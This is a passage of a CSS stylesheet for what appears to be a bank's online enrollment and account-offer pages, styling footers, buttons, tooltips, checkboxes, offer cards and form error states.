    background-image: url("../images/footer-left-arc.png");
    left: 0;
}

.right-rounded-footer {
    background-image: url("../images/footer-right-arc.png");
    right: 0;
}

.left-rounded-footer, .right-rounded-footer {
    background-repeat: no-repeat;
    background-size: 610px 65px;
    bottom: 0;
    height: 65px;
    position: absolute;
    width: 610px;
    margin-top: 1em;
}


/* footer specs */

.footer {
    background: none repeat scroll 0 0 rgb(244, 244, 244);
    border-top: 1px solid rgb(244, 244, 244);
    color: rgb(112, 112, 112);
    font-size: 1.2rem;
    font-weight: 400;
    line-height: 1.4rem;
    position: relative;
    z-index: 4;
}

.footer-container {
    box-sizing: border-box;
    margin: 0 auto;
    max-width: 1000px;
    padding: 20px 10px 10px 10px;
}

.ehl-icon:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10a";
    font-size: 1.5em;
    padding: 0 5px 0 0;
    position: relative;
    top: .28em;
}

.disclaimer > p {
    margin: 0;
}

.disclaimer-list {
    list-style: disc outside none;
    margin: 0;
    padding: 0;
}

    .disclaimer-list > li {
        display: inline;
    }



/* button specs */

.align-right {
    text-align: right;
}


.button-primary {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    border: medium none;
    border-radius: 4px;
    color: rgb(255, 255, 255);
    cursor: pointer;
    font-size: 16px;
    min-width: 120px;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    outline: none;
}

    .button-primary:hover, .button-primary:focus {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }

.button-primary {
    color: rgb(255, 255, 255);
}

.button-row {
    padding: 4em 0;
}

.button-content {
    margin: 0 auto;
    max-width: 1000px;
    padding: 0 10px;
}

.button-row button {
    float: right;
}

.button-row .button-secondary {
    float: left;
}

.button-row .align-left {
    float: left;
}

.esign-btn {
    padding-top: 1em !important;
}

.button-row.align-center {
    text-align: center;
    padding: 1em;
}

.button-row button.disabled {
    background-color: rgb(153, 175, 198);
    transition: background 0.15s ease-in 0s;
}


.button-secondary {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    border: 1px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: rgb(0, 56, 113);
    cursor: pointer;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    margin-right: 30px;
}

.button-tertiary {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em;
}

.button-link {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em;
}

.button-secondary:hover,
.button-secondary:active,
.button-secondary:focus {
    text-decoration: none;
    color: #00294d;
    border-color: #00294d;
}

.button-tertiary:hover,
.button-tertiary:active,
.button-tertiary:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-link:hover,
.button-link:active,
.button-link:focus {
    text-decoration: underline;
    color: #005EAD;
}

.button-tertiary:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01a";
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 9px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary.nox:before {
    content: none;
}

.button-tertiary:hover:before,
.button-tertiary:active:before,
.button-tertiary:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-tertiary-link:hover,
.button-tertiary-link:active,
.button-tertiary-link:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-tertiary-link {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em !important;
}

    .button-tertiary-link:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        text-decoration: none;
        display: inline-block;
        position: relative;
        top: -3px;
        border-radius: 50%;
        color: #ffffff;
        font-size: 9px;
        text-align: center;
        line-height: 1em;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
        padding: 4px;
        margin-right: 5px;
    }

.button-link:before {
    display: inline-block;
    text-decoration: inherit;
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 14px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary-link.nox:before {
    content: none;
}

.button-link.nox:before {
    content: none;
}

.button-link:hover:before,
.button-link:active:before,
.button-link:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-tertiary-link:hover:before,
.button-tertiary-link:active:before,
.button-tertiary-link:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}



/* tooltip specs */



.icon-tooltip {
    display: inline-block;
    position: relative;
    height: 16px;
    width: 16px;
    cursor: pointer;
}

    .icon-tooltip:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e039";
        color: #ffffff;
        background: #aaa;
        font-size: 10px;
        line-height: 16px;
        text-align: center;
        border-radius: 50%;
        position: absolute;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
    }


.input-label .icon-tooltip {
    top: 3px;
    margin-left: 2px;
}


.tooltip-note {
    color: #C94C06;
    font-size: 1.4rem;
}

    .tooltip-note .icon-tooltip {
        top: 2px;
        left: 3px;
    }

.tooltip-title {
    padding: 3px 5px;
    margin: 5px -5px 3px -5px;
    background: #333;
    border-radius: 4px;
    font-weight: bold;
}


/* ************* Temp form styles  *************** */

form *, * {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}

form fieldset {
    border: 0;
    margin: 0;
    padding: 0;
}
/*chandra - 19.5 START */
.bootstrap {
    color: rgb(51, 51, 51);
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 1.5rem;
    font-weight: normal;
    line-height: 2rem;
    margin: 0;
    border-top: 0px solid #fff;
}

    .bootstrap .firstrow {
        margin-top: -10px;
    }

    .bootstrap .form-input-control {
        width: 100%;
        border: 1px solid #CCCCCC;
        border-radius: 4px;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
        color: rgb(51, 51, 51);
        font-family: "suntrustregular", "Trebuchet MS", sans-serif;
        font-size: 16px;
        padding: 0px 10px 0px 10px;
        height: 40px;
        /* Zero out the gradients that are the default for a couple of native form controls in some browsers */
        background: -moz-linear-gradient(top, #fff 0%, #fff 100%); /* FF3.6+ */
        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fff), color-stop(100%,#fff)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top, #fff 0%,#fff 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top, #fff 0%,#fff 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top, #fff 0%,#fff 100%); /* IE10+ */
        background: linear-gradient(to bottom, #fff 0%,#fff 100%); /* W3C */
    }
.citizenship-multiselect{
    width:36% !important;
}
.control-label {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    ;
    color: #333333;
    font-size: 15px;
}

.pdf-links {
    font-size: 15px;
    color:#005EAD !important;
}
.offer-section {
     margin-bottom:20px;
}
.offer-details-links {
font-size: 15px;
    color:#005EAD !important;
    cursor:pointer;
   
}

    .arrow-setting {
    width: 20px;
    height: 20px;
    position: relative;
    top:-3px;
    cursor:pointer;
    }

.check-icon-li > li {
    list-style: none;
    margin-bottom: 1em;
    overflow: visible;
    /*padding-left: 15px;*/
    position: relative;
    font-size: 15px;
}

.non-check-icon-li > li {
    margin-bottom: 1em;
    overflow: visible;
    /*padding-left: 15px;*/
    position: relative;
    font-size: 15px;
}

    .non-check-icon-li > li.pdf-link-bullet {
        list-style-type: none;
        position: relative;
        left: -17px;
        padding-top:0px;
    }
 .non-check-icon-li >li.pdf-link-bullet a {
color:#005EAD !important;
}
.tickmark-li:before{
    left: -21px;
    position: absolute;
    content: "\e010";
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    padding-right: 1em;
    color: #02A397;
}

.tickmark-li.greyText {
    color: #707070;
}

    .tickmark-li.greyText:before {
        display: none;
    }

.promo-details {
    font-size: 18px;
}

.promo-sidebar {
    padding-right: 0px;
    margin-top: 8px;
}

.promo-link {
    color: #005EAD !important;
    font-size:15px;
    padding-left:5px;
}
/* .promo-link:before{
    background:url("../images/X\ Remove.svg");
    background-repeat: no-repeat;
    height: 20px;
    width: auto;
    margin-top: 6px;
} */
.remove-promo {
    width: 10px;
    height: 10px;
    position: relative;
    bottom: 3px;
}

.tooltip {
    pointer-events: none;
}

.promo-header {
    font-size: 23px;
    color: #003B71;
    font-weight: bold;
    line-height: 1.5;
    margin-bottom: 2rem !important;
}
/*.card {
	border-radius:4px 4px 4px 4px;
    min-height:144px;
	vertical-align:middle;
    border:2px;
    border-style: solid;
    border-color: #CFCFCF;
    padding: 29px 37px 26px 47px;
}*/
.recommendation-header {
    margin-top: 50px;
    margin-bottom: 30px;
    font-weight: bold;
    font-size: 20px;
}

.offer-card .col-md-6 .card-pdf {
    padding-left: 24px !important;
    padding-bottom: 30px;
    margin-left: 1px;
    margin-right: 1px;
}

.card-pdf {
    padding-left: 47px !important;
    padding-bottom: 30px;
    margin-left: 1px !important;
    margin-right: 1px !important;
    margin-bottom:1px !important;
}

.special-upgrade {
    background: transparent linear-gradient(180deg, #D66112 0%, #C94C06 100%) 0% 0% no-repeat padding-box;
    /* border: 1px solid #D66112; */
    border-radius: 22px;
    opacity: 1;
    height: 36px;
    width: 176px;
    margin-top: 60px;
    margin-bottom: 33px;
}

    .special-upgrade p {
        text-align: left;
        color: #FFFFFF;
        top: -18px;
        left: 45px;
        position: relative;
    }
    

.special-upgrade-img {
    position: relative;
    top: 8px;
    left: 18px;
}
.special-upgrade-RTOOffer {
    background: transparent linear-gradient(180deg, #D66112 0%, #C94C06 100%) 0% 0% no-repeat padding-box;
    /* border: 1px solid #D66112; */
    border-radius: 22px;
    opacity: 1;
    height: 36px;
    width: 176px;
    margin-top: 60px;
    margin-bottom: 33px;
}
.special-upgrade-RTOOffer p {
    text-align: center;
    color: #FFFFFF;
    padding-top: 6px;
}
.offer-card .card {
    border-radius: 4px 4px 4px 4px !important;
    height: 100%;
}

.offer-card > .row {
margin-bottom:30px;
}
.offer-card > .row:last-child {
margin-bottom:0px;
}
.offer-card > .row:first-child {
margin-top:25px;
}
    
.offer-card .card-body {
    padding-left: 47px !important;
    padding-top: 29px !important;
    padding-bottom: 0px !important;
}

.offer-card .col-md-6 .card-body {
    padding-left: 24px !important;
    padding-top: 29px !important;
    padding-bottom: 0px !important;
}

.offer-card .card-footer {
    height: 56px;
    background-color: #D4E1EF !important;
    text-align: left !important;
    color: #005EAD;
    cursor: pointer;
    padding: .75rem 1.25rem !important;
}

    .offer-card .card-footer:last-child {
        border-radius: 0px !important;
    }

.offer-card .selected {
    background-color: #005EAD !important;
    color: #FFFFFF;
}

.offer-card .offer-added {
    border-color: #005EAD !important;
}

.offer-suggestion-question {
    margin-top: 30px !important;
}

.checkbox {
    display: inline-block;
    width: 100%;
    margin: 0;
}

    .checkbox + .checkbox {
        margin-top: 10px;
    }

fieldset .checkbox {
    margin: 10px 0;
}

.checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 8px;
    left: 32px;
    position: relative;
}

.owners-list .checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 14px;
    left: 8px;
    position: relative;
}

    .owners-list .checkbox input[type="checkbox"] + label {
        font-size: 1.7rem;
        padding-left: 40px;
        vertical-align: middle;
        line-height: 15px;
        position: relative;
        top: -23px;
    }

.checkbox .text-muted {
    color: #808080 !important;
}

.owners-list .checkbox input[type="checkbox"] + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #707070;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 8px;
    top: 8px;
    outline: none;
}

.owners-list .checkbox input[type="checkbox"]:checked + label:before {
    background: url("../images/Checkmark_White.svg") no-repeat scroll 57% center;
    border: 1px solid #005EAD !important;
    border-radius: 4px !important;
    background-color: #005EAD !important;
}

.owners-list .checkbox input[type="checkbox"]:disabled + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #ffffff !important;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 8px;
    top: 8px;
    outline: none;
}

.owners-list .checkbox input[type="checkbox"]:checked:disabled + label:before {
    background: url("../images/Checkmark_Gray.svg") no-repeat scroll 57% center;
}

.icon-class {
    background-color: #D4E1EF !important;
    height: 100%;
    position: relative;
    border: 1px solid #005EAD;
    border-radius: 4px 0px 0px 4px;
}

.circle {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    line-height: 50px;
    text-align: center;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: url(../images/Important_blue.svg) no-repeat;
}

.Additionalowners-note .row {
    height: 100% !important;
    box-sizing: border-box;
    margin: 0 !important;
}

    .Additionalowners-note .row .col-md-3 {
        padding-right: 0;
        padding-left: 0;
    }

    .Additionalowners-note .row .col-md-9 {
        padding-left: 30px;
        border: 1px solid #005ead;
        border-left: none;
        border-radius: 0px 4px 4px 0px;
    }

.Additionalowners-note {
    /*border: 1px solid #005EAD !important ;*/
    border-radius: 4px;
    height: 158px;
    margin: 1em 0 1em 0 !important;
}

    .Additionalowners-note .pdf-links {
        font-size: 12px;
    }

.offer-card .col-md-6 .checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 8px;
    left: 9px;
    position: relative;
}

.checkbox input[type="checkbox"] + label {
    font-size: 20px;
    padding-left: 40px;
    vertical-align: middle;
    line-height: 22px;
    margin-bottom: 0 !important;
}

.offer-card .col-md-6 .checkbox input[type="checkbox"] + label {
    padding-left: 20px;
}

.checkbox input[type="checkbox"] + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #005EAD;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 47px;
    top: 8px;
    outline: none;
}

.offer-card .col-md-6 .checkbox input[type="checkbox"] + label:before {
    left: 24px;
}

.checkbox input[type="checkbox"]:checked + label:before {
    background: url("../images/blue.svg") no-repeat scroll 57% center;
    border: 1px solid #005EAD !important;
    border-radius: 4px !important;
}

input[type="checkbox"]:focus + label:before {
    outline: none;
    border: 1px solid #005EAD;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);
}

label[for=field_check] {
    height: 75px;
    line-height: 75px;
    overflow: hidden;
    display: inline-block;
    border-radius: 10px;
}

.bootstrap .tooltipinner {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 14px;
    background-color: transparent;
    font-weight: normal;
    font-style: normal;
}

.bootstrap .tooltip-inner {
    max-width: 300px;
    padding: 1.25rem 1.25rem 1.25rem 1.25rem;
    color: #fff;
    line-height: 1.5rem;
    text-align: left;
    background-color: #000;
    border-radius: 0;
}


.bootstrap .field-icon a {
    position: relative;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
    /*position: relative;*/
    float: right;
    right: 10px;
    bottom: 30px;
}

.LoginModal .bootstrap .field-icon a {
    position: relative;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
    /*position: absolute;*/
    float: right;
    right: 20px;
    top: 30px;
}

.bootstrap .field-icon a:not([href]):not([tabindex]),
.bootstrap .field-icon a:not([href]):not([tabindex]):focus,
.bootstrap .field-icon a:not([href]):not([tabindex]):hover {
    color: #005EAD;
}

.bootstrap .sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 0px 0px 0px 18px;
    padding: 0px;
}

    .bootstrap .sub-text-row-lock.locked:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e025";
        color: #ddd;
        font-size: 12px;
        margin: 0 6px;
        position: relative;
        margin-left: -18px;
    }

.bootstrap .inline-error {
    display: inline-block;
}

.bootstrap .aligntop {
    margin-top: -20px;
}

.bootstrap .info-text {
    font-size: 12px;
    line-height: 16px;
    color: #707070;
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
}

.olb-info-text {
    margin-bottom: 25px;
}

::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
    color: #B4B3B3;
    opacity: 1; /* Firefox */
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
    color: #B4B3B3;
}

::-ms-input-placeholder { /* Microsoft Edge */
    color: #B4B3B3;
}

.subtitle {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 18px;
    color: #333333;
}

.bootstrap .phonetype-dropdown {
    width: 42%;
    border-radius: 4px 0px 0px 4px;
}

.bootstrap .phonetext {
    margin-left: -3px;
    border-radius: 0px 4px 4px 0px;
    width: 57%;
}

.bootstrap .input-control-select {
    overflow: visible;
    padding: 1px;
    margin: 0 0 10px 0;
    border: none;
    display: inline-block;
}

.toppadding {
    padding-top: 10px;
}

.hidecontrol {
    display: none;
}

.sub-label-padding {
    margin-top: -5px;
    margin-bottom: 10px;
}

.bootstrap .hasError .input-error {
    background-image: url('../images/Group 243.svg');
    background-repeat: no-repeat;
    height: 20px;
    width: auto;
    margin-top: 6px;
}

.bootstrap .hasError select,
.bootstrap .hasError input[type=text],
.bootstrap .hasError input[type=email],
.bootstrap .hasError input[type=url],
.bootstrap .hasError input[type=password],
.bootstrap .hasError input[type=color],
.bootstrap .hasError input[type=date],
.bootstrap .hasError input[type=datetime],
.bootstrap .hasError input[type=datetime-local],
.bootstrap .hasError input[type=email],
.bootstrap .hasError input[type=month],
.bootstrap .hasError input[type=number],
.bootstrap .hasError input[type=range],
.bootstrap .hasError input[type=search],
.bootstrap .hasError input[type=tel],
.bootstrap .hasError input[type=time],
.bootstrap .hasError input[type=url],
.bootstrap .hasError input[type=week],
.bootstrap .hasError textarea,
.bootstrap .hasError .selectize-control .selectize-input,
.bootstrap .hasError .input-control-select .inputTags-list {
    border-color: #DB0018;
    border-width: 1px;
}
.bootstrap .hasError .inputTags-list {
    border-color: #DB0018;
    border-width: 1px;
}

.hasError .selectize-control .selectize-input {
    border-color: #DB0018 !important;
    border-width: 1px;
}

.bootstrap .hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: #DB0018;
    margin-left: 24px;
    padding-top: 2px;
}
/*chandra - 19.5 END */
/*chandra - 6/14*/
h3.legend {
    padding: 0 10px;
    border-radius: 3px;
    border-bottom: 0px solid #eee;
    margin: 2em 0px;
    font-size: 1em;
    color: #fff;
    text-align: left;
    letter-spacing: 1px;
    font-weight: normal;
    /* background:rgb(0, 56, 113); -- ADA Compliant Blue */
    background: #C94C06; /*  -- ADA Compliant Gray */
    /* background:#D66112; -- ADA Compliant Orange */
}
h3.legendDEP {
    margin: 1.6em 0px !important;
}
    h3 .legend + .switch-section, h3.legend + .photoid-container {
        margin-top: -32px;
    }

    h3.legend.tight {
        margin-top: 0;
    }

    h3.legend.next-steps {
        background: #fff;
        font-size: 1.17em;
        padding: 0;
        color: #ccc;
        border-bottom: 1px solid #eee;
        margin: 2em 10px;
        color: #333;
    }


    h3.legend + .content-copy {
        margin-top: -1em;
    }


h3.question {
    color: #333;
    border: 0;
    margin: 2em 10px;
    margin-bottom: 1em;
}


.input-row, .input-control {
    /* clear: both;       not sure why this is here, but it's messing things up */
    overflow: hidden;
    padding: 1px;
    margin: 0 0 10px 0;
}

    .input-row.special, .input-row.special .input-control {
        overflow: visible;
    }

    .input-row.checkbox-row {
        margin-bottom: 0;
    }

    .input-row.radio-row {
        /* clear: both;       not sure why this is here, but it's messing things up */
        margin-top: 0;
        margin-bottom: 10px;
    }

.input-control, .input-text, .input-button, .input-photo {
    margin: 0;
    display: inline-block;
    margin-bottom: 0;
    width: 60%;
    vertical-align: middle;
}

.input-text {
    margin: 11px 0;
    padding-left: 10px;
}

.input-button {
    margin: 9px 0 5px 0;
    padding-left: 0px;
    position: relative;
    top: -5px;
}

.input-photo {
    margin: 9px 0 5px 0;
    padding-left: 0px;
}

.retake-photo-link {
    position: relative;
    top: -10px;
    left: 10px;
    font-size: 13px;
}

.input-button .button-inline {
    padding: 8px;
    min-width: 150px;
    text-align: center;
}

.radio-row .input-label {
    margin-top: 8px;
}

.radio-row .input-control, .checkbox-row .input-control, .checkbox-toggle-row .input-control {
    padding-top: 3px;
    /*changed from 2px for radios, make sure is fine for checkboxes */
}

.checkbox-toggle-row .input-control {
    padding-top: 5px;
}

.input-row select.sub-control {
    display: block;
    border: 0;
    color: #aaa;
    width: auto;
}

.input-row .input-label {
    display: inline-block;
    font-weight: bold;
    text-align: right;
    vertical-align: top;
    padding-top: 11px;
    padding-right: 5px;
    width: 39%;
}
/*****Chandra Start - 6/14******/
input::-ms-clear {
    display: none;
}

.floatleft {
    float: left;
}

.btn:hover {
    color: #212529;
    text-decoration: none;
}

.floatright {
    float: right;
}

.sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: -10px 0 5px 40%;
    padding: 0 5px;
}

.print {
    display: inline-block;
    position: relative;
    margin: 2.8em 0 .5em 0;
    background: url(../images/Print_Icon.svg) no-repeat;
    background-size: 20px 20px;
}

    .print span {
        display: inline-block;
        margin-left: 30px;
        line-height: 1.2em;
        font-weight: normal;
        font-family: suntrustregular;
        font-size: 12px;
        text-align: center;
        color: #005EAD;
    }

.bootstrap .customcard {
    background-color: #F8F1E7;
    border-radius: 4px 4px 4px 4px;
    min-height: 144px;
    vertical-align: middle;
    border: 0;
}

.bootstrap .card-header {
    margin-bottom: 0;
    background-color: #F8F1E7;
    border-bottom: 0px;
    padding: 20px 0px 10px 0px;
}

.bootstrap .confirmationfields .field {
    font-family: suntrustregular;
    font-weight: bold;
    font-size: 12px;
    color: #333333;
}

.bootstrap .confirmationfields .value {
    font-family: suntrustregular;
    font-size: 14px;
    color: #333333;
}

.bootstrap .confirmationfields .note-text {
    margin-top: 11px;
    color: #333333;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.bootstrap .row-spacing {
    margin-top: 30px;
}

.bootstrap .card-body {
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 0px 20px 0px 20px;
}

.bootstrap .card-footer {
    padding: 20px 0px 20px 0px;
    background-color: #F8F1E7;
    border-top: 0px;
}

    .bootstrap .card-footer a {
        border-radius: 4px 4px 4px 4px;
        background-color: #D55A2B;
        width: 104px;
        height: 35px;
        color: #FFFFFF;
        font-family: suntrustregular;
        outline: none;
        border: none;
        text-decoration: none;
        font-size: 12px;
        padding: 8px 0px 0px 0px;
    }


        .bootstrap .card-footer a:active, .bootstrap .card-footer a:focus {
            -moz-outline-style: none;
            outline: none;
            border: none;
        }

        .bootstrap .card-footer a:hover, .bootstrap .card-footer a:focus, .bootstrap .card-footer a:visited {
            border-radius: 4px 4px 4px 4px;
            background-color: #D55A2B;
            width: 104px;
            height: 35px;
            color: #FFFFFF;
            font-family: suntrustregular;
            outline: none;
            border: none;
            text-decoration: none;
            font-size: 12px;
            padding: 8px 0px 0px 0px;
        }


.bootstrap .customcard .card-title {
    font-family: "suntrustregular";
    font-weight: bold;
    font-size: 14px;
    color: #D55A2B;
}

.bootstrap .customcard .card-text {
    font-family: "suntrustregular";
    font-size: 12px;
    color: #333333;
    line-height: normal;
}

.sub-text-row-lock.locked .info-text:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 12px;
    margin: 0 6px;
    position: relative;
    margin-left: -8px;
}

.clickable-div {
    cursor: pointer;
}

.tooltip {
    pointer-events: none;
}

.tooltipinner {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 14px;
    background-color: transparent;
    font-weight: normal;
    font-style: normal;
}

.bootstrap .tooltip-inner {
    max-width: 300px;
    padding: 1.25rem 1.25rem 1.25rem 1.25rem;
    color: #fff;
    line-height: 1.5rem;
    text-align: left;
    background-color: #000;
    border-radius: 0;
}

/*****Chandra Start******/
/*********** Text Box ************/
input::-ms-clear {
    display: none;
}

.floatleft {
    float: left;
}

.btn:hover {
    color: #212529;
    text-decoration: none;
}

.floatright {
    float: right;
}

/*********** Text Box ************/
.sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: -10px 0 5px 40%;
    padding: 0 5px;
}

.print {
    display: inline-block;
    position: relative;
    margin: 2.8em 0 .5em 0;
    background: url(../images/Print_Icon.svg) no-repeat;
}

    .print span {
        display: inline-block;
        margin-left: 30px;
        line-height: 1.2em;
        font-weight: normal;
        font-family: suntrustregular;
        font-size: 12px;
        text-align: center;
        color: #005EAD;
    }

.bootstrap .customcard {
    background-color: #F8F1E7;
    border-radius: 4px 4px 4px 4px;
    min-height: 144px;
    vertical-align: middle;
    text-align: center;
    border: 0;
}

    .bootstrap .customcard:not(:last-child) {
        margin-right: 0px;
    }

.bootstrap .card-header {
    margin-bottom: 0;
    background-color: #F8F1E7;
    border-bottom: 0px;
    text-align: center;
    padding: 20px 0px 10px 0px;
}

.bootstrap .confirmationfields .field {
    font-family: suntrustregular;
    font-weight: bold;
    font-size: 12px;
    color: #333333;
}

.bootstrap .confirmationfields .value {
    font-family: suntrustregular;
    font-size: 14px;
    color: #333333;
}

.bootstrap .confirmationfields .note-text {
    margin-top: 11px;
    color: #333333;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
}

.bootstrap .row-spacing {
    margin-top: 30px;
}

.bootstrap .card-body {
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 0px 20px 0px 20px;
}

.bootstrap .card-footer {
    padding: 20px 0px 20px 0px;
    background-color: #F8F1E7;
    border-top: 0px;
    text-align: center;
}

    .bootstrap .card-footer a {
        border-radius: 4px 4px 4px 4px;
        background-color: #C94C06;
        width: 104px;
        height: 35px;
        color: #FFFFFF;
        font-family: suntrustregular;
        font-size: 12px;
        padding: 7px 0px 0px 0px;
    }

.bootstrap .customcard .card-title {
    font-family: "suntrustregular";
    font-weight: bold;
    font-size: 19px;
    color: #C94C06;
}

.bootstrap .customcard .card-text {
    font-family: "suntrustregular";
    font-size: 12px;
    color: #333333;
    line-height: normal;
}

.sub-text-row-lock.locked .info-text:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e025";
    color: #ddd;
    font-size: 12px;
    margin: 0 6px;
    position: relative;
    margin-left: -8px;
}

.field-icon a {
    position: absolute;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
}
/* Close Button on OLB Enrollement page Begin*/

.closeolb {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

    .closeolb.rounded::before, .closeolb.rounded::after {
        border-radius: 2px;
    }

    .closeolb::before, .closeolb::after {
        content: '';
        position: absolute;
        height: 2px;
        width: 100%;
        top: 50%;
        left: 0;
        text-align: left;
        background: #CCCCCC;
    }

    .closeolb::before {
        -webkit-transform: rotate(45deg);
        -moz-transform: rotate(45deg);
        -ms-transform: rotate(45deg);
        -o-transform: rotate(45deg);
        transform: rotate(45deg);
    }

    .closeolb::after {
        -webkit-transform: rotate(-45deg);
        -moz-transform: rotate(-45deg);
        -ms-transform: rotate(-45deg);
        -o-transform: rotate(-45deg);
        transform: rotate(-45deg);
    }
/* Close button in OLB Enrollement page end */
.close {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

.dot {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
}

.close.rounded::before, .close.rounded::after {
    border-radius: 2px;
}

.dot::before {
    content: '';
    background: url(../images/Ellipse.svg) no-repeat;
    position: absolute;
    height: 16px;
    width: 16px;
    left: 0;
    top: 4px;
}

.close::before, .close::after {
    content: '.';
    position: absolute;
    height: 2px;
    width: 100%;
    top: 50%;
    left: 0;
    text-align: left;
    background: #CCCCCC;
}

.close::before {
    -webkit-transform: rotate(45deg);
    -moz-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    -o-transform: rotate(45deg);
    transform: rotate(45deg);
}

.close::after {
    -webkit-transform: rotate(-45deg);
    -moz-transform: rotate(-45deg);
    -ms-transform: rotate(-45deg);
    -o-transform: rotate(-45deg);
    transform: rotate(-45deg);
}

.invalidclose {
    position: relative;
    display: inline-block;
    width: 10px;
    height: 10px;
    overflow: hidden;
    margin-left: -8px;
}

    .invalidclose.rounded::before, .invalidclose.rounded::after {
        border-radius: 2px;
    }

    .invalidclose::before, .invalidclose::after {
        content: '';
        position: absolute;
        height: 2px;
        width: 100%;
        top: 50%;
        left: 0;
        text-align: left;
        background: #DB0018;
    }

    .invalidclose::before {
        -webkit-transform: rotate(45deg);
        -moz-transform: rotate(45deg);
